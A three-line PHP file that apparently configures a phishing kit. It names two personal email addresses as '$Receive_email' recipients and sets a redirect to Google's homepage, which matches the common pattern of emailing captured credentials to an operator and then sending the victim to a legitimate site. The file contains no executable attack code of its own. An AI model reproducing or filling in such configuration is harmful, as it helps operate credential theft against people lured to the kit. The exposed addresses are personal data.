<?php 
$Receive_email="kayleygerhold87@gmail.com,geanelle.manongdo@novellimo.com";
$redirect="https://www.google.com/";
?>